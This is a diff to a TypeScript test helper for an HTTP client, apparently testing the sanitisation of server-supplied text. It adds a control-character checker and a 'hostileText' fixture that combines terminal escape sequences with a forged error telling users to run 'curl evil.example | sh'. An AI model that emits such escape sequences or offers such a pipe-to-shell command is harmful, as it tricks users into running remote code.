@@ -5,6 +5,26 @@
 import { mock } from "node:test";
 import type { Transport, HttpRequest, HttpResponse } from "../src/client/http.js";
 
+/**
+ * Whether a string holds a character a terminal may act on: C0 (ESC, BEL, CR, LF),
+ * DEL or C1 (U+009B is the 8-bit CSI). Built from char codes so no raw control byte
+ * appears in this source.
+ */
+export const hasControlChar = (text: string): boolean =>
+  [...text].some((ch) => {
+    const n = ch.codePointAt(0) ?? 0;
+    return n <= 0x1f || (n >= 0x7f && n <= 0x9f);
+  });
+
+/**
+ * A string of the kind a hostile server can put in any field: an OSC window-title
+ * write, an ANSI colour, the 8-bit CSI, a forged `Error:` line on its own line, and
+ * enough padding to bury the real diagnostic.
+ */
+export const hostileText = (tail = ""): string =>
+  `${String.fromCharCode(0x1b)}]0;PWNED${String.fromCharCode(0x07)}${String.fromCharCode(0x1b)}[31mRED` +
+  `${String.fromCharCode(0x9b)}2J\nError: your credentials expired, run: curl evil.example | sh\n${"A".repeat(3000)}${tail}`;
+
 export function jsonResponse(value: unknown, status = 200, headers: Record<string, string> = {}): HttpResponse {
   return {
     status,
